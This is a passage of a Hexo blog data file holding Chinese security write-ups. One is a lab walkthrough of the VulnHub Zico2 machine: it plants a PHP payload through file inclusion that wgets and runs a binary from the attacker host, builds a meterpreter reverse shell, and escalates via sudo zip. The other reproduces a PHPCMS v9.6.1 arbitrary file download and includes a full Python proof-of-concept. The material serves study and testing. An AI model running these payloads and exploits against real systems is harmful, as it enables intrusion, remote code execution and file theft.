权限提升\n\n获得靶机shell后查看用户，发现不是root，需要提权。\n\n![](hack-zico\\7.png)\n\n首先查看`/etc/passwd`文件，找出id大于1000的用户，发现值得关注的用户有root、zico。\n\n![](hack-zico\\8.png)\n\n查找属主为zico的文件：`find / -user zico 2> /dev/null`，执行后结果过多。直接`cd /home/zico`到zico的家目录。发现其中有个wordpress目录，猜测应该是博客系统代码。进入该目录发现wordpress的配置文件wp-config.php，查看文件内容，找到数据库密码：`sWfCsfJSPV9H3AmQzw8`。\n\n![](hack-zico\\9.png)\n\n尝试使用该用户名密码登录SSH：`ssh zico@sWfCsfJSPV9H3AmQzw8`。成功登录。\n\n使用`sudo -l`命令查看zico用户可以执行的root命令。发现可以执行`/bin/tar`、`/usr/bin/zip`。\n\n![](hack-zico\\10.png)\n\n执行`touch /tmp/exploit`、`sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command=\"bash -c /bin/sh\"`\n\n成功提权至root。\n\n![](hack-zico\\11.png)\n\n获取flag，进入root用户家目录，flag在目录下的flag.txt文件。\n\n![](hack-zico\\12.png)\n\n**另一种提权方式**\n\n获得反弹shell后，查看系统内核版本，发现内核版本为3.2.0-23。\n\n![](hack-zico\\13.png)\n\n到[Exploit-DB](https://www.exploit-db.com/search)搜索内核提权漏洞，并下载Exp到靶机编译执行。\n\n![](hack-zico\\14.png)\n\n## 0x04 总结\n\n- 文件包含Getshell，还可以尝试包含其他文件，如SSH登录日志文件等。\n- Python2搭建简单HTTP服务器来传文件：`python -m SimpleHTTPServer 80`\n- 上传/执行文件遇权限问题时，可传到`/tmp`目录。\n\n**参考连接**\n\nhttps://www.colabug.com/1925534.html","slug":"hack-zico","published":1,"updated":"2019-02-27T06:47:55.868Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83l1002j7or0rf7bv5ww","content":"<h2 id=\"0x00-环境\"><a href=\"#0x00-环境\" class=\"headerlink\" title=\"0x00 环境\"></a>0x00 环境</h2><ul>\n<li>靶机：<a href=\"https://www.vulnhub.com/series/zico2,137/#modal210download\" target=\"_blank\" rel=\"noopener\">Zico2</a></li>\n<li>攻击机：Kali Linux</li>\n<li>VirtualBox<ul>\n<li>网络连接方式：host-only、DHCP</li>\n</ul>\n</li>\n<li>目标：boot2root获取flag。</li>\n</ul>\n<a id=\"more\"></a>\n<h2 id=\"0x01-信息收集与漏洞挖掘\"><a href=\"#0x01-信息收集与漏洞挖掘\" class=\"headerlink\" title=\"0x01 信息收集与漏洞挖掘\"></a>0x01 信息收集与漏洞挖掘</h2><p><strong>1.主机发现：</strong><code>nmap -sn 192.168.110.0/24</code></p>\n<p>靶机自动获取IP，使用nmap进行主机发现，最终确定：靶机IP为192.168.110.3、攻击机IP：192.168.110.4、宿主机：192.168.110.5。</p>\n<p><img src=\"/2019/02/26/hack-zico/discovery.png\" alt></p>\n<p><strong>2.端口探测：</strong><code>nmap -Pn -sV -n -T4 -p- 192.168.110.3</code></p>\n<p>端口探测结果如下图，关注端口号22的SSH服务以及端口号80的Web服务。</p>\n<p>还确定了靶机系统为Ubuntu Linux、Web容器为Apache。</p>\n<p><img src=\"/2019/02/26/hack-zico/port.png\" alt></p>\n<p><strong>3.Web服务</strong></p>\n<ul>\n<li>服务探测：<code>whatweb http://192.168.110.3 -a 3</code></li>\n</ul>\n<p><img src=\"/2019/02/26/hack-zico/whatweb.png\" alt></p>\n<ul>\n<li>目录爆破：<code>dirb http://192.168.110.3</code></li>\n</ul>\n<p>爆破发现dbadmin，访问发现存在目录遍历漏洞，且目录下存在test_db.php文件。</p>\n<p><img src=\"/2019/02/26/hack-zico/dirb.png\" alt></p>\n<p><img src=\"/2019/02/26/hack-zico/dbadmin.png\" alt></p>\n<p>访问test_db.php发现是sqlite数据库连接管理页面phpLiteAdmin（类似phpmyadmin），尝试弱口令admin，成功进入。</p>\n<p>进入数据库管理页面后可获得以下信息：</p>\n<blockquote>\n<p>数据库路径：<code>/usr/databases/</code></p>\n<p>数据库名：<code>test_users</code></p>\n<p>数据表：<code>info</code></p>\n</blockquote>\n<p><img src=\"/2019/02/26/hack-zico/1.png\" alt></p>\n<p>查看数据表info，发现里面存在两条记录，判断是用户的用户名和密码。将密码拿到<a href=\"https://www.somd5.com/\" target=\"_blank\" rel=\"noopener\">somd5</a>网站解密，得到结果：</p>\n<blockquote>\n<p>root  34kroot34</p>\n<p>zico  zico2215@</p>\n</blockquote>\n<p>将得到的两个用户名密码尝试进行SSH登录，结果失败。</p>\n<ul>\n<li>漏洞扫描</li>\n</ul>\n<p>使用宿主机的AWVS进行漏洞扫描，发现存在文件包含、目录穿越漏洞。存在漏洞的连接为：<code>http://192.168.110.3/view.php?page=tools.html</code></p>\n<p><img src=\"/2019/02/26/hack-zico/2.png\" alt></p>\n<p>验证漏洞，尝试包含/etc/passwd文件，发现成功包含。</p>\n<p><img src=\"/2019/02/26/hack-zico/3.png\" alt></p>\n<h2 id=\"0x02-Getshell\"><a href=\"#0x02-Getshell\" class=\"headerlink\" title=\"0x02 Getshell\"></a>0x02 Getshell</h2><p>sqlite属于单文件数据库，类似Access数据库。</p>\n<p><strong>1.思路一</strong></p>\n<p>尝试通过数据库管理页面创建数据库的功能点创建一个shell文件，创建<code>../../var/www/html/shell.php</code>，<code>/</code>会被过滤，该方法不可行。</p>\n<p><strong>2.思路二：文件包含Getshell</strong></p>\n<p>先尝试通过日志文件<code>/var/log/apache2/access.log</code>，先访问<code>http://192.168.110.3/&lt;?php phpinfo();?&gt;</code>，然后尝试包含日志文件，发现没用。猜测是因为没有读取权限。</p>\n<p>包含数据库文件Getshell</p>\n<p>首先通过phpLiteAdmin向info表插入一条数据：<code>&lt;?php system(&quot;cd /tmp;wget http://192.168.110.4/shell;chmod +x shell;./shell&quot;);?&gt;</code>，该记录作用是进入/tmp目录，然后通过wget从攻击机上下载shell文件，再对shell文件添加执行权限然后运行。</p>\n<p><img src=\"/2019/02/26/hack-zico/4.png\" alt></p>\n<p>然后在攻击机上使用msfvenon生成shell文件：<code>msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.110.4 lport=4444 -f elf &gt; shell</code></p>\n<p>在shell文件所在的路径建立一个简单HTTP服务器：<code>python -m SimpleHTTPServer 80</code></p>\n<p>设置msf监听，<code>use exploit/multi/hander</code>、<code>set payload linux/x86/meterpreter/reverse_tcp</code>、<code>set lhost 192.168.110.4</code>。</p>\n<p>访问连接<code>http://192.168.110.3/view.php?page=../../usr/databases/test_users</code>，然后会得到一个meterpreter会话。</p>\n<p><img src=\"/2019/02/26/hack-zico/5.png\" alt></p>\n<h2 id=\"0x03-权限提升\"><a href=\"#0x03-权限提升\" class=\"headerlink\" title=\"0x03 权限提升\"></a>0x03 权限提升</h2><p>获得靶机shell后查看用户，发现不是root，需要提权。</p>\n<p><img src=\"/2019/02/26/hack-zico/7.png\" alt></p>\n<p>首先查看<code>/etc/passwd</code>文件，找出id大于1000的用户，发现值得关注的用户有root、zico。</p>\n<p><img src=\"/2019/02/26/hack-zico/8.png\" alt></p>\n<p>查找属主为zico的文件：<code>find / -user zico 2&gt; /dev/null</code>，执行后结果过多。直接<code>cd /home/zico</code>到zico的家目录。发现其中有个wordpress目录，猜测应该是博客系统代码。进入该目录发现wordpress的配置文件wp-config.php，查看文件内容，找到数据库密码：<code>sWfCsfJSPV9H3AmQzw8</code>。</p>\n<p><img src=\"/2019/02/26/hack-zico/9.png\" alt></p>\n<p>尝试使用该用户名密码登录SSH：<code>ssh zico@sWfCsfJSPV9H3AmQzw8</code>。成功登录。</p>\n<p>使用<code>sudo -l</code>命令查看zico用户可以执行的root命令。发现可以执行<code>/bin/tar</code>、<code>/usr/bin/zip</code>。</p>\n<p><img src=\"/2019/02/26/hack-zico/10.png\" alt></p>\n<p>执行<code>touch /tmp/exploit</code>、<code>sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command=&quot;bash -c /bin/sh&quot;</code></p>\n<p>成功提权至root。</p>\n<p><img src=\"/2019/02/26/hack-zico/11.png\" alt></p>\n<p>获取flag，进入root用户家目录，flag在目录下的flag.txt文件。</p>\n<p><img src=\"/2019/02/26/hack-zico/12.png\" alt></p>\n<p><strong>另一种提权方式</strong></p>\n<p>获得反弹shell后，查看系统内核版本，发现内核版本为3.2.0-23。</p>\n<p><img src=\"/2019/02/26/hack-zico/13.png\" alt></p>\n<p>到<a href=\"https://www.exploit-db.com/search\" target=\"_blank\" rel=\"noopener\">Exploit-DB</a>搜索内核提权漏洞，并下载Exp到靶机编译执行。</p>\n<p><img src=\"/2019/02/26/hack-zico/14.png\" alt></p>\n<h2 id=\"0x04-总结\"><a href=\"#0x04-总结\" class=\"headerlink\" title=\"0x04 总结\"></a>0x04 总结</h2><ul>\n<li>文件包含Getshell，还可以尝试包含其他文件，如SSH登录日志文件等。</li>\n<li>Python2搭建简单HTTP服务器来传文件：<code>python -m SimpleHTTPServer 80</code></li>\n<li>上传/执行文件遇权限问题时，可传到<code>/tmp</code>目录。</li>\n</ul>\n<p><strong>参考连接</strong></p>\n<p><a href=\"https://www.colabug.com/1925534.html\" target=\"_blank\" rel=\"noopener\">https://www.colabug.com/1925534.html</a></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"0x00-环境\"><a href=\"#0x00-环境\" class=\"headerlink\" title=\"0x00 环境\"></a>0x00 环境</h2><ul>\n<li>靶机：<a href=\"https://www.vulnhub.com/series/zico2,137/#modal210download\" target=\"_blank\" rel=\"noopener\">Zico2</a></li>\n<li>攻击机：Kali Linux</li>\n<li>VirtualBox<ul>\n<li>网络连接方式：host-only、DHCP</li>\n</ul>\n</li>\n<li>目标：boot2root获取flag。</li>\n</ul>","more":"<h2 id=\"0x01-信息收集与漏洞挖掘\"><a href=\"#0x01-信息收集与漏洞挖掘\" class=\"headerlink\" title=\"0x01 信息收集与漏洞挖掘\"></a>0x01 信息收集与漏洞挖掘</h2><p><strong>1.主机发现：</strong><code>nmap -sn 192.168.110.0/24</code></p>\n<p>靶机自动获取IP，使用nmap进行主机发现，最终确定：靶机IP为192.168.110.3、攻击机IP：192.168.110.4、宿主机：192.168.110.5。</p>\n<p><img src=\"/2019/02/26/hack-zico/discovery.png\" alt></p>\n<p><strong>2.端口探测：</strong><code>nmap -Pn -sV -n -T4 -p- 192.168.110.3</code></p>\n<p>端口探测结果如下图，关注端口号22的SSH服务以及端口号80的Web服务。</p>\n<p>还确定了靶机系统为Ubuntu Linux、Web容器为Apache。</p>\n<p><img src=\"/2019/02/26/hack-zico/port.png\" alt></p>\n<p><strong>3.Web服务</strong></p>\n<ul>\n<li>服务探测：<code>whatweb http://192.168.110.3 -a 3</code></li>\n</ul>\n<p><img src=\"/2019/02/26/hack-zico/whatweb.png\" alt></p>\n<ul>\n<li>目录爆破：<code>dirb http://192.168.110.3</code></li>\n</ul>\n<p>爆破发现dbadmin，访问发现存在目录遍历漏洞，且目录下存在test_db.php文件。</p>\n<p><img src=\"/2019/02/26/hack-zico/dirb.png\" alt></p>\n<p><img src=\"/2019/02/26/hack-zico/dbadmin.png\" alt></p>\n<p>访问test_db.php发现是sqlite数据库连接管理页面phpLiteAdmin（类似phpmyadmin），尝试弱口令admin，成功进入。</p>\n<p>进入数据库管理页面后可获得以下信息：</p>\n<blockquote>\n<p>数据库路径：<code>/usr/databases/</code></p>\n<p>数据库名：<code>test_users</code></p>\n<p>数据表：<code>info</code></p>\n</blockquote>\n<p><img src=\"/2019/02/26/hack-zico/1.png\" alt></p>\n<p>查看数据表info，发现里面存在两条记录，判断是用户的用户名和密码。将密码拿到<a href=\"https://www.somd5.com/\" target=\"_blank\" rel=\"noopener\">somd5</a>网站解密，得到结果：</p>\n<blockquote>\n<p>root  34kroot34</p>\n<p>zico  zico2215@</p>\n</blockquote>\n<p>将得到的两个用户名密码尝试进行SSH登录，结果失败。</p>\n<ul>\n<li>漏洞扫描</li>\n</ul>\n<p>使用宿主机的AWVS进行漏洞扫描，发现存在文件包含、目录穿越漏洞。存在漏洞的连接为：<code>http://192.168.110.3/view.php?page=tools.html</code></p>\n<p><img src=\"/2019/02/26/hack-zico/2.png\" alt></p>\n<p>验证漏洞，尝试包含/etc/passwd文件，发现成功包含。</p>\n<p><img src=\"/2019/02/26/hack-zico/3.png\" alt></p>\n<h2 id=\"0x02-Getshell\"><a href=\"#0x02-Getshell\" class=\"headerlink\" title=\"0x02 Getshell\"></a>0x02 Getshell</h2><p>sqlite属于单文件数据库，类似Access数据库。</p>\n<p><strong>1.思路一</strong></p>\n<p>尝试通过数据库管理页面创建数据库的功能点创建一个shell文件，创建<code>../../var/www/html/shell.php</code>，<code>/</code>会被过滤，该方法不可行。</p>\n<p><strong>2.思路二：文件包含Getshell</strong></p>\n<p>先尝试通过日志文件<code>/var/log/apache2/access.log</code>，先访问<code>http://192.168.110.3/&lt;?php phpinfo();?&gt;</code>，然后尝试包含日志文件，发现没用。猜测是因为没有读取权限。</p>\n<p>包含数据库文件Getshell</p>\n<p>首先通过phpLiteAdmin向info表插入一条数据：<code>&lt;?php system(&quot;cd /tmp;wget http://192.168.110.4/shell;chmod +x shell;./shell&quot;);?&gt;</code>，该记录作用是进入/tmp目录，然后通过wget从攻击机上下载shell文件，再对shell文件添加执行权限然后运行。</p>\n<p><img src=\"/2019/02/26/hack-zico/4.png\" alt></p>\n<p>然后在攻击机上使用msfvenon生成shell文件：<code>msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.110.4 lport=4444 -f elf &gt; shell</code></p>\n<p>在shell文件所在的路径建立一个简单HTTP服务器：<code>python -m SimpleHTTPServer 80</code></p>\n<p>设置msf监听，<code>use exploit/multi/hander</code>、<code>set payload linux/x86/meterpreter/reverse_tcp</code>、<code>set lhost 192.168.110.4</code>。</p>\n<p>访问连接<code>http://192.168.110.3/view.php?page=../../usr/databases/test_users</code>，然后会得到一个meterpreter会话。</p>\n<p><img src=\"/2019/02/26/hack-zico/5.png\" alt></p>\n<h2 id=\"0x03-权限提升\"><a href=\"#0x03-权限提升\" class=\"headerlink\" title=\"0x03 权限提升\"></a>0x03 权限提升</h2><p>获得靶机shell后查看用户，发现不是root，需要提权。</p>\n<p><img src=\"/2019/02/26/hack-zico/7.png\" alt></p>\n<p>首先查看<code>/etc/passwd</code>文件，找出id大于1000的用户，发现值得关注的用户有root、zico。</p>\n<p><img src=\"/2019/02/26/hack-zico/8.png\" alt></p>\n<p>查找属主为zico的文件：<code>find / -user zico 2&gt; /dev/null</code>，执行后结果过多。直接<code>cd /home/zico</code>到zico的家目录。发现其中有个wordpress目录，猜测应该是博客系统代码。进入该目录发现wordpress的配置文件wp-config.php，查看文件内容，找到数据库密码：<code>sWfCsfJSPV9H3AmQzw8</code>。</p>\n<p><img src=\"/2019/02/26/hack-zico/9.png\" alt></p>\n<p>尝试使用该用户名密码登录SSH：<code>ssh zico@sWfCsfJSPV9H3AmQzw8</code>。成功登录。</p>\n<p>使用<code>sudo -l</code>命令查看zico用户可以执行的root命令。发现可以执行<code>/bin/tar</code>、<code>/usr/bin/zip</code>。</p>\n<p><img src=\"/2019/02/26/hack-zico/10.png\" alt></p>\n<p>执行<code>touch /tmp/exploit</code>、<code>sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command=&quot;bash -c /bin/sh&quot;</code></p>\n<p>成功提权至root。</p>\n<p><img src=\"/2019/02/26/hack-zico/11.png\" alt></p>\n<p>获取flag，进入root用户家目录，flag在目录下的flag.txt文件。</p>\n<p><img src=\"/2019/02/26/hack-zico/12.png\" alt></p>\n<p><strong>另一种提权方式</strong></p>\n<p>获得反弹shell后，查看系统内核版本，发现内核版本为3.2.0-23。</p>\n<p><img src=\"/2019/02/26/hack-zico/13.png\" alt></p>\n<p>到<a href=\"https://www.exploit-db.com/search\" target=\"_blank\" rel=\"noopener\">Exploit-DB</a>搜索内核提权漏洞，并下载Exp到靶机编译执行。</p>\n<p><img src=\"/2019/02/26/hack-zico/14.png\" alt></p>\n<h2 id=\"0x04-总结\"><a href=\"#0x04-总结\" class=\"headerlink\" title=\"0x04 总结\"></a>0x04 总结</h2><ul>\n<li>文件包含Getshell，还可以尝试包含其他文件，如SSH登录日志文件等。</li>\n<li>Python2搭建简单HTTP服务器来传文件：<code>python -m SimpleHTTPServer 80</code></li>\n<li>上传/执行文件遇权限问题时，可传到<code>/tmp</code>目录。</li>\n</ul>\n<p><strong>参考连接</strong></p>\n<p><a href=\"https://www.colabug.com/1925534.html\" target=\"_blank\" rel=\"noopener\">https://www.colabug.com/1925534.html</a></p>"},{"title":"PHPCMSv9.6.1任意文件下载漏洞复现","date":"2019-02-25T12:32:30.000Z","_content":"\n## 0x00 环境介绍\n\n- 系统：Windows 10\n- Phpstudy 2018\n- CMS：PHPCMS v9.6.1\n  - PHPCMS v9各版本下载地址：`http://download.phpcms.cn/v9/9.6/`\n\n<!-- more -->\n\n## 0x01 安装PHPCMS v9\n\n首先下载PHPCMS v9.6.1并解压，将解压得到的install_package目录拷贝到网站根目录下。\n\n启动phpstudy，访问`http://localhost/install_package/install/install.php`进入安装界面。\n\n依次点击下一步进行安装即可，数据库密码phpstudy默认是root/root。\n\n## 0x02 漏洞利用\n\n**1.获取Cookie：xxx_siteid**\n\n首先访问`http://localhost/install_package/index.php?m=wap&c=index&a=init&siteid=1`并获取Cookie。\n\n![](phpcms9-6-1\\siteid.png)\n\n**2.获取Cookie：xxx_att_json**\n\n访问`http://localhost/install_package/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D1%26catid%3D1%26s%3D./phpcms/modules/content/down.ph%26f%3Dp%3%25252%2*70C`，并将上一步获取的siteid的Cookie值作为POST字段userid_flash的值一同提交，然后从响应消息中找到xxx_att_json的Cookie值。\n\n![](phpcms9-6-1\\att_json.png)\n\n要点：\n\n> - `src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D1%26catid%3D1%26s%3D./phpcms/modules/content/down.ph%26f%3Dp%3%25252%2*70C`是payload，是我们要下载的文件。此处我们使用的payload实现要下载的文件是`/phpcms/modules/content/down.php`。\n\n**3.获取下载链接**\n\n访问`http://localhost/install_package/index.php?m=content&c=down&a=init&a_k=`，并将上一步得到的xxx_att_json的值作为a_k参数的值。\n\n> `http://localhost/install_package/index.php?m=content&c=down&a=init&a_k=61e9vtz6uMRQ6iACSVg06WBUXXslD430-hA7DDHM_5cMyGqOkQDeAPBXQURI2hDzEa-inCgLSjD2Ru66mQASlP3Qd06DqBJfeSuqMlZHaTOYO_VdhkWCDz8TD8SEQ3qoqho4ILiuVMSp7f_j05YY57YruJ1uIdHMbqaTyfClLBPv95lNtaRHQszhD9GZ0QEh8g`\n\n访问过后，会返回一个带有下载按钮的页面，点击下载按钮即可下载。\n\n![](phpcms9-6-1\\download.png)\n\n## 0x03 遇到的问题\n\n得到下载连接访问页面，点击下载会报参数错误。\n\n解决办法：\n\n> - `https://blog.csdn.net/vindraz/article/details/12579211`\n> - `http://www.cmsyou.com/support/172.html`\n\n## 0x04 修复建议\n\n升级PHPCMS版本到9.6.2或以上。\n\n## 0x05 PoC\n\n- Github：`https://github.com/sh4douu/PoC-and-Exp/blob/master/phpcmsv961.py`\n- 代码：\n\n```python\nimport requests\nimport re\nimport sys\n\nheaders = {\"User-Agent\":\"Mozilla/5.0 (Windows NT 6.1; WOW64)\"}\n\ndef get_cookie1(host):\n    url_1 = host + \"/index.php?m=wap&c=index&a=init&siteid=1\"\n    print(\"[*] 请稍等...正在获取Cookie:\")\n    reponse = requests.get(url_1,headers=headers)\n\n    \n    try:\n        pattern = r\".*siteid\"  #phpcmsv9 siteid字段格式为：xxxx_siteid,使用该正则匹配\n        for item in reponse.cookies.keys():\n            res = re.findall(pattern,item)\n\n            if res:\n                cookie1 = reponse.cookies.get(res[0])\n                print(\"[+] 获取到Cookie1:\")\n                print(\"[+] \" + res[0] + \":\" + cookie1)\n                return cookie1\n\n    except:\n        print(\"[-] 获取Cookie1失败!\")\n\ndef get_cookie2(host,cookie1):\n    #该payload实现下载phpcms/modules/content/down.php文件 \n    payload = \"src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3Dphpcms%2fmodules%2fcontent%2fdown.ph%26f=p%3%252%2*77C\"\n    \n    #payload = \"src%3Dpad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26f%3D%2Ep%25253chp%26s%3Dindex%26pade%3D\"\n    #payload = \"src%3Dpad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dindex%26f%3D%2Ep%25253chp%26pade%3D\"\n\n    url_2 = host + \"/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&\" + payload\n        \n    data = {\"userid_flash\":cookie1}  #将第一次得到的cookie作为\"userid_flash\"的值，并以POST方式提交\n    reponse = requests.post(url_2,data=data,headers=headers)\n\n    try:\n        pattern = r\".*att_json\" #phpcmsv9 att_json字段格式为：xxxx_att_json,使用该正则匹配\n        for item in reponse.cookies.keys():\n            res = re.findall(pattern,item)\n            if res:\n                cookie2 = reponse.cookies.get(res[0])\n                print(\"[+] 获取到Cookie2:\")\n                print(\"[+] \" + res[0] + \":\" + cookie2)\n                return cookie2\n\n    except:\n        print(\"[-] 获取Cookie2失败!\")\n\ndef help():\n    print(\"-------------------------------------------------------------------------\")\n    print(\" [*] 使用说明：给出index.php之前的部分\")\n    print(\"       Usage: python3 phpcmsv9.py http://host:port\")\n    print(\"     Example：python3 phpcmsv9.py http://localhost/phpcms\")\n    print(\"-------------------------------------------------------------------------\")\n\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 2:\n        help()\n        sys.exit(0)\n\n    host = sys.argv[1].strip()\n    cookie1 = get_cookie1(host)\n    cookie2 = get_cookie2(host,cookie1)\n\n    if cookie2:\n        print(\"[+] Open link to download file: \")\n        print(\"[+] \" + host + \"/index.php?m=content&c=down&a=init&a_k=\" + cookie2) #最终文件下载连接\n```\n\n","source":"_posts/phpcms9-6-1.md","raw":"---\ntitle: PHPCMSv9.6.1任意文件下载漏洞复现\ndate: 2019-02-25 20:32:30\ntags:\n\t- PHPCMSv9  \n\t- 任意文件下载 \n\t- PHP\ncategories: 漏洞复现\n---\n\n## 0x00 环境介绍\n\n- 系统：Windows 10\n- Phpstudy 2018\n- CMS：PHPCMS v9.6.1\n  - PHPCMS v9各版本下载地址：`http://download.phpcms.cn/v9/9.6/`\n\n<!-- more -->\n\n## 0x01 安装PHPCMS v9\n\n首先下载PHPCMS v9.6.1并解压，将解压得到的install_package目录拷贝到网站根目录下。\n\n启动phpstudy，访问`http://localhost/install_package/install/install.php`进入安装界面。\n\n依次点击下一步进行安装即可，数据库密码phpstudy默认是root/root。\n\n## 0x02 漏洞利用\n\n**1.获取Cookie：xxx_siteid**\n\n首先访问`http://localhost/install_package/index.php?m=wap&c=index&a=init&siteid=1`并获取Cookie。\n\n![](phpcms9-6-1\\siteid.png)\n\n**2.获取Cookie：xxx_att_json**\n\n访问`http://localhost/install_package/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D1%26catid%3D1%26s%3D./phpcms/modules/content/down.ph%26f%3Dp%3%25252%2*70C`，并将上一步获取的siteid的Cookie值作为POST字段userid_flash的值一同提交，然后从响应消息中找到xxx_att_json的Cookie值。\n\n![](phpcms9-6-1\\att_json.png)\n\n要点：\n\n> - `src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D1%26catid%3D1%26s%3D./phpcms/modules/content/down.ph%26f%3Dp%3%25252%2*70C`是payload，是我们要下载的文件。此处我们使用的payload实现要下载的文件是`/phpcms/modules/content/down.php`。\n\n**3.获取下载链接**\n\n访问`http://localhost/install_package/index.php?m=content&c=down&a=init&a_k=`，并将上一步得到的xxx_att_json的值作为a_k参数的值。\n\n> `http://localhost/install_package/index.php?m=content&c=down&a=init&a_k=61e9vtz6uMRQ6iACSVg06WBUXXslD430-hA7DDHM_5cMyGqOkQDeAPBXQURI2hDzEa-inCgLSjD2Ru66mQASlP3Qd06DqBJfeSuqMlZHaTOYO_VdhkWCDz8TD8SEQ3qoqho4ILiuVMSp7f_j05YY57YruJ1uIdHMbqaTyfClLBPv95lNtaRHQszhD9GZ0QEh8g`\n\n访问过后，会返回一个带有下载按钮的页面，点击下载按钮即可下载。\n\n![](phpcms9-6-1\\download.png)\n\n## 0x03 遇到的问题\n\n得到下载连接访问页面，点击下载会报参数错误。\n\n解决办法：\n\n> - `https://blog.csdn.net/vindraz/article/details/12579211`\n> - `http://www.cmsyou.com/support/172.html`\n\n## 0x04 修复建议\n\n升级PHPCMS版本到9.6.2或以上。\n\n## 0x05 PoC\n\n- Github：`https://github.com/sh4douu/PoC-and-Exp/blob/master/phpcmsv961.py`\n- 代码：\n\n```python\nimport requests\nimport re\nimport sys\n\nheaders = {\"User-Agent\":\"Mozilla/5.0 (Windows NT 6.1; WOW64)\"}\n\ndef get_cookie1(host):\n    url_1 = host + \"/index.php?m=wap&c=index&a=init&siteid=1\"\n    print(\"[*] 请稍等...正在获取Cookie:\")\n    reponse = requests.get(url_1,headers=headers)\n\n    \n    try:\n        pattern = r\".*siteid\"  #phpcmsv9 siteid字段格式为：xxxx_siteid,使用该正则匹配\n        for item in reponse.cookies.keys():\n            res = re.findall(pattern,item)\n\n            if res:\n                cookie1 = reponse.cookies.get(res[0])\n                print(\"[+] 获取到Cookie1:\")\n                print(\"[+] \" + res[0] + \":\" + cookie1)\n                return cookie1\n\n    except:\n        print(\"[-] 获取Cookie1失败!\")\n\ndef get_cookie2(host,cookie1):\n    #该payload实现下载phpcms/modules/content/down.php文件 \n    payload = \"src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3Dphpcms%2fmodules%2fcontent%2fdown.ph%26f=p%3%252%2*77C\"\n    \n    #payload = \"src%3Dpad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26f%3D%2Ep%25253chp%26s%3Dindex%26pade%3D\"\n    #payload = \"src%3Dpad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dindex%26f%3D%2Ep%25253chp%26pade%3D\"\n\n    url_2 = host + \"/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&\" + payload\n        \n    data = {\"userid_flash\":cookie1}  #将第一次得到的cookie作为\"userid_flash\"的值，并以POST方式提交\n    reponse = requests.post(url_2,data=data,headers=headers)\n\n    try:\n        pattern = r\".*att_json\" #phpcmsv9 att_json字段格式为：xxxx_att_json,使用该正则匹配\n        for item in reponse.cookies.keys():\n            res = re.findall(pattern,item)\n            if res:\n                cookie2 = reponse.cookies.get(res[0])\n                print(\"[+] 获取到Cookie2:\")\n                print(\"[+] \" + res[0] + \":\" + cookie2)\n                return cookie2\n\n    except:\n        print(\"[-] 获取Cookie2失败!\")\n\ndef help():\n    print(\"-------------------------------------------------------------------------\")\n    print(\" [*] 使用说明：给出index.php之前的部分\")\n    print(\"       Usage: python3 phpcmsv9.py http://host:port\")\n    print(\"     Example：python3 phpcmsv9.py http://localhost/phpcms\")\n    print(\"-------------------------------------------------------------------------\")\n\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 2:\n        help()\n        sys.exit(0)\n\n    host = sys.argv[1].strip()\n    cookie1 = get_cookie1(host)\n    cookie2 = get_cookie2(host,cookie1)\n\n    if cookie2:\n        print(\"[+] Open link to download file: \")\n        print(\"[+] \" + host + \"/index.php?m=content&c=down&a=init&a_k=\" + cookie2) #最终文件下载连接\n```\n\n","slug":"phpcms9-6-1","published":1,"updated":"2019-03-22T00:46:47.654Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83l3002m7or0kse3861n","content":"<h2 id=\"0x00-环境介绍\"><a href=\"#0x00-环境介绍\" class=\"headerlink\" title=\"0x00 环境介绍\"></a>0x00 环境介绍</h2><ul>\n<li>系统：Windows 10</li>\n<li>Phpstudy 2018</li>\n<li>CMS：PHPCMS v9.6.1<ul>\n<li>PHPCMS v9各版本下载地址：<code>http://download.phpcms.cn/v9/9.6/</code></li>\n</ul>\n</li>\n</ul>\n<a id=\"more\"></a>\n<h2 id=\"0x01-安装PHPCMS-v9\"><a href=\"#0x01-安装PHPCMS-v9\" class=\"headerlink\" title=\"0x01 安装PHPCMS v9\"></a>0x01 安装PHPCMS v9</h2><p>首先下载PHPCMS v9.6.1并解压，将解压得到的install_package目录拷贝到网站根目录下。</p>\n<p>启动phpstudy，访问<code>http://localhost/install_package/install/install.php</code>进入安装界面。</p>\n<p>依次点击下一步进行安装即可，数据库密码phpstudy默认是root/root。</p>\n<h2 id=\"0x02-漏洞利用\"><a href=\"#0x02-漏洞利用\" class=\"headerlink\" title=\"0x02 漏洞利用\"></a>0x02 漏洞利用</h2><p><strong>1.获取Cookie：xxx_siteid</strong></p>\n<p>首先访问<code>http://localhost/install_package/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1</code>并获取Cookie。</p>\n<p><img src=\"/2019/02/25/phpcms9-6-1/siteid.png\" alt></p>\n<p><strong>2.获取Cookie：xxx_att_json</strong></p>\n<p>访问<code>http://localhost/install_package/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D1%26catid%3D1%26s%3D./phpcms/modules/content/down.ph%26f%3Dp%3%25252%2*70C</code>，并将上一步获取的siteid的Cookie值作为POST字段userid_flash的值一同提交，然后从响应消息中找到xxx_att_json的Cookie值。</p>\n<p><img src=\"/2019/02/25/phpcms9-6-1/att_json.png\" 